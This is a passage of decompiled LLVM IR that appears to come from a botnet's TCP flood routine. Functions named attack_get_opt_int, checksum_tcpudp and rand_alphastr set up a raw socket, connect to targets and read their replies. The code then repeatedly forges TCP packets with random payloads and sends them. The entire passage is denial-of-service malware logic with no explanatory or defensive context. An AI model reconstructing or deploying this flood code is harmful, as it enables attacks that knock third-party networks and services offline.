  %v3_b480 = urem i32 %v6_b468, 65536
  store i32 %v3_b480, i32* @sb, align 4
  %v4_b484 = inttoptr i32 %v0_b46c to i32*
  %v5_b484 = call i32 @attack_get_opt_int(i32 %v0_b47c, i32* %v4_b484, i32 10, i32 %v0_b478)
  %v1_b48c = urem i32 %v5_b484, 256
  store i32 %v1_b48c, i32* %ip.global-to-local, align 4
  %v0_b490 = load i32, i32* @r4, align 4
  store i32 %v0_b490, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b49c = load i32, i32* @r5, align 4
  store i32 %v0_b49c, i32* %r0.global-to-local, align 4
  %v5_b4a4 = inttoptr i32 %v0_b490 to i32*
  %v6_b4a4 = call i32 @attack_get_opt_int(i32 %v0_b49c, i32* %v5_b4a4, i32 11, i32 1)
  %v1_b4ac = urem i32 %v6_b4a4, 256
  store i32 %v1_b4ac, i32* %ip.global-to-local, align 4
  %v0_b4b0 = load i32, i32* @r4, align 4
  store i32 %v0_b4b0, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b4bc = load i32, i32* @r5, align 4
  store i32 %v0_b4bc, i32* %r0.global-to-local, align 4
  %v5_b4c4 = inttoptr i32 %v0_b4b0 to i32*
  %v6_b4c4 = call i32 @attack_get_opt_int(i32 %v0_b4bc, i32* %v5_b4c4, i32 12, i32 1)
  %v1_b4cc = urem i32 %v6_b4c4, 256
  store i32 %v1_b4cc, i32* %ip.global-to-local, align 4
  %v0_b4d0 = load i32, i32* @r4, align 4
  store i32 %v0_b4d0, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_b4d8 = load i32, i32* @r7, align 4
  store i32 %v0_b4d8, i32* %r3.global-to-local, align 4
  %v0_b4dc = load i32, i32* @r5, align 4
  store i32 %v0_b4dc, i32* %r0.global-to-local, align 4
  %v5_b4e4 = inttoptr i32 %v0_b4d0 to i32*
  %v6_b4e4 = call i32 @attack_get_opt_int(i32 %v0_b4dc, i32* %v5_b4e4, i32 13, i32 %v0_b4d8)
  %v1_b4ec = urem i32 %v6_b4e4, 256
  store i32 %v1_b4ec, i32* %ip.global-to-local, align 4
  %v0_b4f0 = load i32, i32* @r4, align 4
  store i32 %v0_b4f0, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  %v0_b4f8 = load i32, i32* @r7, align 4
  store i32 %v0_b4f8, i32* %r3.global-to-local, align 4
  %v0_b4fc = load i32, i32* @r5, align 4
  store i32 %v0_b4fc, i32* %r0.global-to-local, align 4
  %v5_b504 = inttoptr i32 %v0_b4f0 to i32*
  %v6_b504 = call i32 @attack_get_opt_int(i32 %v0_b4fc, i32* %v5_b504, i32 14, i32 %v0_b4f8)
  %v1_b50c = urem i32 %v6_b504, 256
  store i32 %v1_b50c, i32* %ip.global-to-local, align 4
  %v0_b510 = load i32, i32* @r4, align 4
  store i32 %v0_b510, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_b518 = load i32, i32* @r7, align 4
  store i32 %v0_b518, i32* %r3.global-to-local, align 4
  %v0_b51c = load i32, i32* @r5, align 4
  store i32 %v0_b51c, i32* %r0.global-to-local, align 4
  %v5_b524 = inttoptr i32 %v0_b510 to i32*
  %v6_b524 = call i32 @attack_get_opt_int(i32 %v0_b51c, i32* %v5_b524, i32 15, i32 %v0_b518)
  %v1_b52c = urem i32 %v6_b524, 256
  store i32 %v1_b52c, i32* %ip.global-to-local, align 4
  %v0_b530 = load i32, i32* @r7, align 4
  store i32 %v0_b530, i32* %r2.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_b538 = load i32, i32* @r4, align 4
  store i32 %v0_b538, i32* %r1.global-to-local, align 4
  %v0_b53c = load i32, i32* @r5, align 4
  store i32 %v0_b53c, i32* %r0.global-to-local, align 4
  %v5_b544 = inttoptr i32 %v0_b538 to i32*
  %v6_b544 = call i32 @attack_get_opt_int(i32 %v0_b53c, i32* %v5_b544, i32 %v0_b530, i32 768)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b550 = load i32, i32* @r4, align 4
  store i32 %v0_b550, i32* %r1.global-to-local, align 4
  %v0_b558 = load i32, i32* @r5, align 4
  store i32 %v0_b558, i32* %r0.global-to-local, align 4
  %v4_b55c = inttoptr i32 %v0_b550 to i32*
  %v5_b55c = call i32 @attack_get_opt_int(i32 %v0_b558, i32* %v4_b55c, i32 1, i32 1)
  %v1_b564 = urem i32 %v5_b55c, 256
  store i32 %v1_b564, i32* %r3.global-to-local, align 4
  %v0_b568 = load i32, i32* @r7, align 4
  store i32 %v0_b568, i32* %r0.global-to-local, align 4
  %v1_b570 = inttoptr i32 %v0_b568 to i32*
  %v2_b570 = call i32 @__GI_time(i32* %v1_b570)
  %v1_b574 = load i32, i32* @r6, align 4
  %v2_b574 = add i32 %v1_b574, %v2_b570
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_b588 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_b588, i32* %r0.global-to-local, align 4
  %v7_b58c = icmp eq i32 %v3_b588, -1
  store i32 %v3_b588, i32* @sl, align 4
  br i1 %v7_b58c, label %dec_label_pc_b8cc, label %dec_label_pc_b598

dec_label_pc_b598:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_b5a0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_b5a0, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_b5a8 = load i32, i32* @r7, align 4
  store i32 %v0_b5a8, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_b5b4 = call i32 @__GI_setsockopt(i32 %v3_b588, i32 %v0_b5a8, i32 3, i32 %v6_b5a0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_b5b4, i32* %r0.global-to-local, align 4
  %v7_b5b8 = icmp eq i32 %v5_b5b4, -1
  br i1 %v7_b5b8, label %dec_label_pc_b8c4, label %dec_label_pc_b5c0

dec_label_pc_b5c0:                                ; preds = %dec_label_pc_b598
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v0_b5c4 = load i32, i32* @r8, align 4
  %v3_b5c8 = urem i32 %v0_b5c4, 65536
  store i32 %v3_b5c8, i32* @r3, align 4
  %v2_b5cc = icmp eq i32 %arg2, 0
  %v0_b5d0 = load i32, i32* @r7, align 4
  store i32 %v0_b5d0, i32* %stack_var_-44, align 4
  %v5_b5d4 = trunc i32 %v0_b5c4 to i16
  br i1 %v2_b5cc, label %dec_label_pc_b5c0.dec_label_pc_b768.preheader_crit_edge, label %dec_label_pc_b5dc.preheader

dec_label_pc_b5c0.dec_label_pc_b768.preheader_crit_edge: ; preds = %dec_label_pc_b5c0
  %.pre = sext i16 %v5_b5d4 to i32
  %.pre94 = add i32 %v6_b544, 40
  br label %dec_label_pc_b768.preheader

dec_label_pc_b5dc.preheader:                      ; preds = %dec_label_pc_b5c0
  %v2_b620 = ptrtoint i32* %stack_var_-160 to i32
  %v2_b668 = ptrtoint i32* %stack_var_-64 to i32
  %v2_b680 = ptrtoint i32* %stack_var_-80 to i32
  %v2_b688 = ptrtoint i32* %stack_var_-336 to i32
  %v2_b68c = ptrtoint i32* %stack_var_-48 to i32
  %v4_b714 = zext i8 %tmp32 to i32
  %v1_b718 = and i32 %v4_b714, 18
  %v2_b71c = icmp eq i32 %v1_b718, 18
  %v1_b9cc = add i32 %v6_b544, 40
  %v4_ba0c = sext i16 %v5_b5d4 to i32
  %v3_ba18 = udiv i32 %v4_ba0c, 256
  %v1_baf4 = urem i32 %v5_b484, 2
  %tmp95 = sub nsw i32 0, %v1_baf4
  %v4_bafc = and i32 %tmp95, 32
  %v1_bb28 = urem i32 %v6_b4c4, 2
  %tmp96 = sub nsw i32 0, %v1_bb28
  %v4_bb30 = and i32 %tmp96, 8
  %v1_bb74 = urem i32 %v6_b524, 2
  %v3_b700 = sext i16 %tmp62 to i32
  %v1_b724 = and i32 %v4_b714, 5
  %v2_b724 = icmp eq i32 %v1_b724, 0
  %v4_b660 = add i32 %v2_b620, 98
  %v5_b660 = inttoptr i32 %v4_b660 to i16*
  %v1_ba14 = mul nsw i32 %v4_ba0c, 256
  %v4_ba24 = and i32 %v1_ba14, 65280
  %v5_ba24 = or i32 %v4_ba24, %v3_ba18
  %v1_bb0c = urem i32 %v6_b4a4, 2
  %tmp97 = sub nsw i32 0, %v1_bb0c
  %v4_bb14 = and i32 %tmp97, 16
  %v1_bb40 = urem i32 %v6_b4e4, 2
  %tmp98 = sub nsw i32 0, %v1_bb40
  %v4_bb48 = and i32 %tmp98, 4
  %v1_bb58 = urem i32 %v6_b504, 2
  %tmp99 = sub nsw i32 0, %v1_bb58
  %v3_bb60 = and i32 %tmp99, 2
  br label %dec_label_pc_b5dc.outer

dec_label_pc_b5dc.outer:                          ; preds = %dec_label_pc_b5dc.preheader, %.thread10
  %stack_var_-340.0.ph = phi i32 [ %tmp, %dec_label_pc_b5dc.preheader ], [ %v0_ba58, %.thread10 ]
  %stack_var_-62.0.ph = phi i16 [ %tmp33, %dec_label_pc_b5dc.preheader ], [ %stack_var_-62.2, %.thread10 ]
  %stack_var_-60.0.ph = phi i32 [ %tmp36, %dec_label_pc_b5dc.preheader ], [ %v0_b970, %.thread10 ]
  br label %dec_label_pc_b5dc

dec_label_pc_b5dc:                                ; preds = %dec_label_pc_b5dc.outer, %dec_label_pc_b750
  %stack_var_-62.0 = phi i16 [ %stack_var_-62.3, %dec_label_pc_b750 ], [ %stack_var_-62.0.ph, %dec_label_pc_b5dc.outer ]
  %stack_var_-60.0 = phi i32 [ %stack_var_-60.4, %dec_label_pc_b750 ], [ %stack_var_-60.0.ph, %dec_label_pc_b5dc.outer ]
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b5e8 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_b5e8, i32* %r0.global-to-local, align 4
  %v7_b5ec = icmp eq i32 %v3_b5e8, -1
  store i32 %v3_b5e8, i32* @r8, align 4
  br i1 %v7_b5ec, label %dec_label_pc_b750, label %dec_label_pc_b5f8

dec_label_pc_b5f8:                                ; preds = %dec_label_pc_b5dc, %dec_label_pc_b72c
  %v0_b600 = phi i32 [ %v3_b740, %dec_label_pc_b72c ], [ %v3_b5e8, %dec_label_pc_b5dc ]
  %stack_var_-62.1 = phi i16 [ %stack_var_-62.2, %dec_label_pc_b72c ], [ %stack_var_-62.0, %dec_label_pc_b5dc ]
  %stack_var_-60.1 = phi i32 [ %v0_b970, %dec_label_pc_b72c ], [ %stack_var_-60.0, %dec_label_pc_b5dc ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_b600 = call i32 @__libc_fcntl(i32 %v0_b600, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_b608 = or i32 %v2_b600, 2048
  store i32 %v1_b608, i32* @r2, align 4
  %v0_b60c = load i32, i32* @r8, align 4
  store i32 %v0_b60c, i32* %r0.global-to-local, align 4
  %v2_b610 = call i32 @__libc_fcntl(i32 %v0_b60c, i32 4)
  store i32 %v2_b610, i32* %r0.global-to-local, align 4
  %v3_b614 = load i32, i32* %stack_var_-44, align 4
  %v5_b61c = mul i32 %v3_b614, 24
  store i32 %v2_b620, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v1_b62c = load i32, i32* @fp, align 4
  %v2_b62c = add i32 %v1_b62c, %v5_b61c
  store i32 %v2_b62c, i32* %r3.global-to-local, align 4
  %v1_b630 = add i32 %v2_b62c, 20
  %v2_b630 = inttoptr i32 %v1_b630 to i8*
  %v3_b630 = load i8, i8* %v2_b630, align 1
  %v4_b630 = zext i8 %v3_b630 to i32
  store i32 %v4_b630, i32* %r2.global-to-local, align 4
  %v2_b634 = icmp ugt i8 %v3_b630, 30
  %v7_b634 = icmp eq i8 %v3_b630, 31
  %v2_b638 = xor i1 %v7_b634, true
  %v3_b638 = and i1 %v2_b634, %v2_b638
  br i1 %v3_b638, label %bb, label %bb72

bb:                                               ; preds = %dec_label_pc_b5f8
  %v5_b638 = add i32 %v2_b62c, 16
  %v6_b638 = inttoptr i32 %v5_b638 to i32*
  %v7_b638 = load i32, i32* %v6_b638, align 4
  store i32 %v7_b638, i32* %r3.global-to-local, align 4
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_b5f8, %bb
  %v4_b63c = phi i32 [ %v2_b62c, %dec_label_pc_b5f8 ], [ %v7_b638, %bb ]
  %v4_b63c.stack_var_-60.1 = select i1 %v3_b638, i32 %v4_b63c, i32 %stack_var_-60.1
  %v2_b640 = xor i1 %v2_b634, true
  %v3_b640 = or i1 %v7_b634, %v2_b640
  br i1 %v3_b640, label %dec_label_pc_b8d8, label %dec_label_pc_b644

dec_label_pc_b644:                                ; preds = %bb72, %dec_label_pc_b8d8
  %v0_b970 = phi i32 [ %v5_b924, %dec_label_pc_b8d8 ], [ %v4_b63c.stack_var_-60.1, %bb72 ]
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b64c = load i32, i32* @sb, align 4
  %v9_b64c = icmp eq i32 %v0_b64c, 65535
  br i1 %v9_b64c, label %dec_label_pc_b930, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_b644
  %v4_b650 = udiv i32 %v0_b64c, 256
  %v2_b654 = urem i32 %v0_b64c, 256
  store i32 %v2_b654, i32* %r2.global-to-local, align 4
  %v5_b658 = mul nuw nsw i32 %v2_b654, 256
  %v6_b658 = or i32 %v5_b658, %v4_b650
  store i32 %v6_b658, i32* %r3.global-to-local, align 4
  store i32 %v2_b620, i32* %ip.global-to-local, align 4
  %v2_b660 = trunc i32 %v6_b658 to i16
  store i16 %v2_b660, i16* %v5_b660, align 2
  br label %dec_label_pc_b668

dec_label_pc_b668:                                ; preds = %.thread7, %dec_label_pc_b930
  %stack_var_-62.2 = phi i16 [ %v1_b930, %dec_label_pc_b930 ], [ %stack_var_-62.1, %.thread7 ]
  store i32 %v2_b668, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_b670 = load i32, i32* @r8, align 4
  store i32 %v0_b670, i32* %r0.global-to-local, align 4
  %v3_b674 = call i32 @__libc_connect(i32 %v0_b670, i32 %v2_b668, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_b67c = call i32 @__GI_time(i32* null)
  store i32 %v2_b67c, i32* %r0.global-to-local, align 4
  store i32 %v2_b680, i32* @r7, align 4
  store i32 %v2_b67c, i32* @r4, align 4
  store i32 %v2_b688, i32* @r6, align 4
  store i32 %v2_b68c, i32* @r5, align 4
  %v9_b6e0 = icmp eq i32 %tmp34, %v0_b970
  %v4_b708 = zext i16 %stack_var_-62.2 to i32
  %. = zext i1 %v9_b6e0 to i32
  %v9_b6f4 = icmp eq i1 %v9_b6e0, false
  %v9_b70c = icmp eq i32 %v3_b700, %v4_b708
  br label %dec_label_pc_b6a4

dec_label_pc_b694:                                ; preds = %.thread, %dec_label_pc_b6fc, %dec_label_pc_b724, %bb76
  %v2_b694 = call i32 @__GI_time(i32* null)
  %v0_b698 = load i32, i32* @r4, align 4
  %v2_b698 = sub i32 %v2_b694, %v0_b698
  store i32 %v2_b698, i32* %r0.global-to-local, align 4
  %v8_b6a0 = icmp sgt i32 %v2_b698, 10
  br i1 %v8_b6a0, label %dec_label_pc_b72c, label %dec_label_pc_b6a4

dec_label_pc_b6a4:                                ; preds = %dec_label_pc_b694, %dec_label_pc_b668
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  store i32 %v2_b688, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b6b4 = load i32, i32* @sl, align 4
  store i32 %v0_b6b4, i32* %r0.global-to-local, align 4
  store i32 16, i32* %stack_var_-48, align 4
  %v6_b6c4 = call i32 @__libc_recvfrom(i32 %v0_b6b4, i32 %v2_b688, i32 256, i32 16384, i32 %v2_b680, i32 %v2_b68c)
  store i32 %v6_b6c4, i32* %r2.global-to-local, align 4
  %v7_b6cc = icmp eq i32 %v6_b6c4, -1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_b6cc, label %dec_label_pc_b8cc, label %dec_label_pc_b6d8

dec_label_pc_b6d8:                                ; preds = %dec_label_pc_b6a4
  store i32 %v0_b970, i32* @r1, align 4
  store i32 %tmp34, i32* @r3, align 4
  store i32 %., i32* @lr, align 4
  %tmp100 = icmp ult i32 %v6_b6c4, 41
  br i1 %tmp100, label %.thread, label %bb76

.thread:                                          ; preds = %dec_label_pc_b6d8
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_b694

bb76:                                             ; preds = %dec_label_pc_b6d8
  br i1 %v9_b6f4, label %dec_label_pc_b694, label %dec_label_pc_b6fc

dec_label_pc_b6fc:                                ; preds = %bb76
  store i32 %v3_b700, i32* @lr, align 4
  store i32 %v2_b620, i32* @r3, align 4
  store i32 %v4_b708, i32* %r2.global-to-local, align 4
  br i1 %v9_b70c, label %dec_label_pc_b714, label %dec_label_pc_b694

dec_label_pc_b714:                                ; preds = %dec_label_pc_b6fc
  store i32 %v4_b714, i32* %r2.global-to-local, align 4
  store i32 %v1_b718, i32* @r3, align 4
  br i1 %v2_b71c, label %dec_label_pc_b964, label %dec_label_pc_b724

dec_label_pc_b724:                                ; preds = %dec_label_pc_b714
  br i1 %v2_b724, label %dec_label_pc_b694, label %dec_label_pc_b72c

dec_label_pc_b72c:                                ; preds = %dec_label_pc_b724, %dec_label_pc_b694
  %v0_b72c = load i32, i32* @r8, align 4
  store i32 %v0_b72c, i32* %r0.global-to-local, align 4
  %v1_b730 = call i32 @__GI___libc_close(i32 %v0_b72c)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b740 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_b740, i32* %r0.global-to-local, align 4
  %v3_b744 = icmp eq i32 %v3_b740, -1
  store i32 %v3_b740, i32* @r8, align 4
  br i1 %v3_b744, label %dec_label_pc_b750, label %dec_label_pc_b5f8

dec_label_pc_b750:                                ; preds = %dec_label_pc_b72c, %dec_label_pc_b5dc
  %stack_var_-62.3 = phi i16 [ %stack_var_-62.0, %dec_label_pc_b5dc ], [ %stack_var_-62.2, %dec_label_pc_b72c ]
  %stack_var_-60.4 = phi i32 [ %stack_var_-60.0, %dec_label_pc_b5dc ], [ %v0_b970, %dec_label_pc_b72c ]
  %v3_b750 = load i32, i32* %stack_var_-44, align 4
  store i32 %arg2, i32* @lr, align 4
  %v1_b758 = add i32 %v3_b750, 1
  store i32 %v1_b758, i32* @r3, align 4
  store i32 %v1_b758, i32* %stack_var_-44, align 4
  %v5_b764 = icmp slt i32 %v1_b758, %arg2
  br i1 %v5_b764, label %dec_label_pc_b5dc, label %dec_label_pc_b768.preheader

dec_label_pc_b768.preheader:                      ; preds = %.thread10, %dec_label_pc_b750, %dec_label_pc_b5c0.dec_label_pc_b768.preheader_crit_edge
  %v1_b7a0.pre-phi = phi i32 [ %.pre94, %dec_label_pc_b5c0.dec_label_pc_b768.preheader_crit_edge ], [ %v1_b9cc, %dec_label_pc_b750 ], [ %v1_b9cc, %.thread10 ]
  %v4_b884.pre-phi = phi i32 [ %.pre, %dec_label_pc_b5c0.dec_label_pc_b768.preheader_crit_edge ], [ %v4_ba0c, %dec_label_pc_b750 ], [ %v4_ba0c, %.thread10 ]
  %v3_b780 = mul i32 %v6_b544, 65536
  %v1_b784 = add i32 %v3_b780, 1310720
  %tmp78 = udiv i32 %v1_b784, 256
  %v3_b790 = and i32 %tmp78, 65280
  %v2_b89c = icmp eq i32 %v1_b564, 0
  %v4_b794 = udiv i32 %v1_b784, 16777216
  %v5_b794 = or i32 %v3_b790, %v4_b794
  %v1_b79c = add i32 %v6_b544, 20
  br label %dec_label_pc_b768

dec_label_pc_b768:                                ; preds = %dec_label_pc_b768.preheader, %dec_label_pc_b94c
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b5cc, label %dec_label_pc_b94c, label %dec_label_pc_b77c

dec_label_pc_b77c:                                ; preds = %dec_label_pc_b768
  store i32 %v1_b784, i32* %r2.global-to-local, align 4
  store i32 %v6_b544, i32* %ip.global-to-local, align 4
  store i32 %v3_b790, i32* %r3.global-to-local, align 4
  store i32 %v5_b794, i32* @sb, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v1_b79c, i32* @r8, align 4
  store i32 %v1_b7a0.pre-phi, i32* @r7, align 4
  br label %dec_label_pc_b898

dec_label_pc_b7a8:                                ; preds = %dec_label_pc_b898, %dec_label_pc_b8a4
  %v2_b7ac = phi i32 [ %v7_b880, %dec_label_pc_b898 ], [ %v2_b7ac.pre, %dec_label_pc_b8a4 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_b7ac = add i32 %v2_b7ac, 10
  %v4_b7ac = inttoptr i32 %v3_b7ac to i16*
  store i16 0, i16* %v4_b7ac, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b7b4 = load i32, i32* @r5, align 4
  store i32 %v0_b7b4, i32* @r0, align 4
  %v2_b7b8 = call i32 @checksum_generic(i32 %v0_b7b4, i32 20)
  %v3_b7b8 = trunc i32 %v2_b7b8 to i16
  store i32 %v2_b7b8, i32* %r0.global-to-local, align 4
  %v3_b7bc = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_b3c0, i32* %ip.global-to-local, align 4
  %v3_b7c4 = mul i32 %v3_b7bc, 16
  %v2_b7c8 = add i32 %v3_b7c4, %v2_b3c0
  store i32 %v2_b7c8, i32* %r1.global-to-local, align 4
  %v1_b7cc = add i32 %v2_b7c8, 4
  %v2_b7cc = inttoptr i32 %v1_b7cc to i32*
  %v3_b7cc = load i32, i32* %v2_b7cc, align 4
  %v3_b7d0 = mul i32 %v3_b7cc, 65536
  store i32 %v3_b7d0, i32* %ip.global-to-local, align 4
  %tmp79 = mul i32 %v3_b7cc, 256
  %v1_b7d8 = and i32 %tmp79, 65280
  %tmp80 = udiv i32 %v3_b7cc, 256
  %v4_b7dc = urem i32 %tmp80, 256
  %v5_b7dc = or i32 %v4_b7dc, %v1_b7d8
  store i32 %v5_b7dc, i32* %r3.global-to-local, align 4
  %v1_b7e0 = add i32 %v3_b7cc, 1
  store i32 %v1_b7e0, i32* %r2.global-to-local, align 4
  store i32 %v1_b7e0, i32* %v2_b7cc, align 4
  %v0_b7e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b7e8 = load i32, i32* @r6, align 4
  %v2_b7e8 = add i32 %v1_b7e8, 4
  %v3_b7e8 = inttoptr i32 %v2_b7e8 to i32*
  store i32 %v0_b7e8, i32* %v3_b7e8, align 4
  %v0_b7ec = load i32, i32* %r1.global-to-local, align 4
  %v1_b7ec = add i32 %v0_b7ec, 8
  %v2_b7ec = inttoptr i32 %v1_b7ec to i32*
  %v3_b7ec = load i32, i32* %v2_b7ec, align 4
  %tmp81 = mul i32 %v3_b7ec, 256
  %v1_b7f8 = and i32 %tmp81, 65280
  %tmp82 = udiv i32 %v3_b7ec, 256
  %v4_b7fc = urem i32 %tmp82, 256
  %v5_b7fc = or i32 %v4_b7fc, %v1_b7f8
  store i32 %v5_b7fc, i32* %r3.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  %v3_b804 = load i32, i32* @r5, align 4
  %v4_b804 = add i32 %v3_b804, 10
  %v5_b804 = inttoptr i32 %v4_b804 to i16*
  store i16 %v3_b7b8, i16* %v5_b804, align 2
  %v0_b808 = load i32, i32* %r3.global-to-local, align 4
  %v1_b808 = load i32, i32* @r6, align 4
  %v2_b808 = add i32 %v1_b808, 8
  %v3_b808 = inttoptr i32 %v2_b808 to i32*
  store i32 %v0_b808, i32* %v3_b808, align 4
  %v0_b80c = load i32, i32* @lr, align 4
  %v1_b80c = trunc i32 %v0_b80c to i16
  %v2_b80c = load i32, i32* @r6, align 4
  %v3_b80c = add i32 %v2_b80c, 16
  %v4_b80c = inttoptr i32 %v3_b80c to i16*
  store i16 %v1_b80c, i16* %v4_b80c, align 2
  %v0_b810 = load i32, i32* @r6, align 4
  store i32 %v0_b810, i32* @r1, align 4
  %v0_b814 = load i32, i32* @sb, align 4
  store i32 %v0_b814, i32* %r2.global-to-local, align 4
  %v0_b818 = load i32, i32* @r8, align 4
  store i32 %v0_b818, i32* %r3.global-to-local, align 4
  %v0_b81c = load i32, i32* @r5, align 4
  store i32 %v0_b81c, i32* %r0.global-to-local, align 4
  %v4_b820 = call i32 @checksum_tcpudp(i32 %v0_b81c, i32 %v0_b810, i32 %v0_b814, i32 %v0_b818)
  %v5_b820 = trunc i32 %v4_b820 to i16
  store i32 %v4_b820, i32* %r0.global-to-local, align 4
  %v3_b824 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b824, i32* %r3.global-to-local, align 4
  %v3_b828 = mul i32 %v3_b824, 32
  store i32 %v3_b828, i32* %lr.global-to-local, align 4
  %v3_b82c = load i32, i32* @r6, align 4
  %v4_b82c = add i32 %v3_b82c, 16
  %v5_b82c = inttoptr i32 %v4_b82c to i16*
  store i16 %v5_b820, i16* %v5_b82c, align 2
  %v0_b830 = load i32, i32* %lr.global-to-local, align 4
  %v1_b830 = load i32, i32* %r3.global-to-local, align 4
  %tmp101 = mul i32 %v1_b830, -8
  %v5_b830 = add i32 %v0_b830, %tmp101
  store i32 %v5_b830, i32* %lr.global-to-local, align 4
  %v0_b834 = load i32, i32* @r6, align 4
  %v1_b834 = add i32 %v0_b834, 2
  %v2_b834 = inttoptr i32 %v1_b834 to i16*
  %v3_b834 = load i16, i16* %v2_b834, align 2
  %v4_b834 = zext i16 %v3_b834 to i32
  store i32 %v4_b834, i32* @r6, align 4
  %v1_b838 = load i32, i32* @fp, align 4
  %v2_b838 = add i32 %v1_b838, %v5_b830
  store i32 %v2_b838, i32* @lr, align 4
  %v3_b83c = add i32 %v2_b838, 2
  %v4_b83c = inttoptr i32 %v3_b83c to i16*
  store i16 %v3_b834, i16* %v4_b83c, align 2
  %v0_b840 = load i32, i32* @r5, align 4
  store i32 %v0_b840, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_b84c = load i32, i32* @sl, align 4
  store i32 %v0_b84c, i32* %r0.global-to-local, align 4
  %v0_b850 = load i32, i32* @r7, align 4
  store i32 %v0_b850, i32* %r2.global-to-local, align 4
  %v0_b854 = load i32, i32* @lr, align 4
  %v6_b85c = call i32 @__libc_sendto(i32 %v0_b84c, i32 %v0_b840, i32 %v0_b850, i32 16384, i32 %v0_b854, i32 16)
  %v3_b860 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b860, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v1_b868 = add i32 %v3_b860, 1
  store i32 %v1_b868, i32* %r0.global-to-local, align 4
  store i32 %v1_b868, i32* %stack_var_-44, align 4
  %v7_b874 = icmp slt i32 %v1_b868, %arg2
  br i1 %v7_b874, label %dec_label_pc_b898, label %dec_label_pc_b94c

dec_label_pc_b898:                                ; preds = %dec_label_pc_b77c, %dec_label_pc_b7a8
  %v1_b880 = phi i32 [ %v1_b868, %dec_label_pc_b7a8 ], [ 0, %dec_label_pc_b77c ]
  store i32 %v2_b3d0, i32* @lr, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  %v4_b880 = mul i32 %v1_b880, 4
  %v5_b880 = add i32 %v4_b880, %v2_b3d0
  %v6_b880 = inttoptr i32 %v5_b880 to i32*
  %v7_b880 = load i32, i32* %v6_b880, align 4
  store i32 %v7_b880, i32* @r5, align 4
  store i32 %v4_b884.pre-phi, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v1_b890 = add i32 %v7_b880, 20
  store i32 %v1_b890, i32* @r6, align 4
  store i32 %v1_b564, i32* %r1.global-to-local, align 4
  br i1 %v2_b89c, label %dec_label_pc_b7a8, label %dec_label_pc_b8a4

dec_label_pc_b8a4:                                ; preds = %dec_label_pc_b898
  %v1_b8a4 = add i32 %v7_b880, 40
  store i32 %v1_b8a4, i32* @r4, align 4
  store i32 %v1_b8a4, i32* %r0.global-to-local, align 4
  store i32 %v6_b544, i32* %r1.global-to-local, align 4
  %v2_b8b0 = call i32 @rand_alphastr(i32 %v1_b8a4, i32 %v6_b544)
  store i32 %v2_b8b0, i32* %r0.global-to-local, align 4
  store i32 %v6_b544, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b8bc = load i32, i32* @r4, align 4
  %v4_b8bc = add i32 %v2_b8bc, %v6_b544
  %v5_b8bc = inttoptr i32 %v4_b8bc to i8*
  store i8 0, i8* %v5_b8bc, align 1
  %v2_b7ac.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_b7a8

dec_label_pc_b8c4:                                ; preds = %dec_label_pc_b598
  %v0_b8c4 = load i32, i32* @sl, align 4
  store i32 %v0_b8c4, i32* %r0.global-to-local, align 4
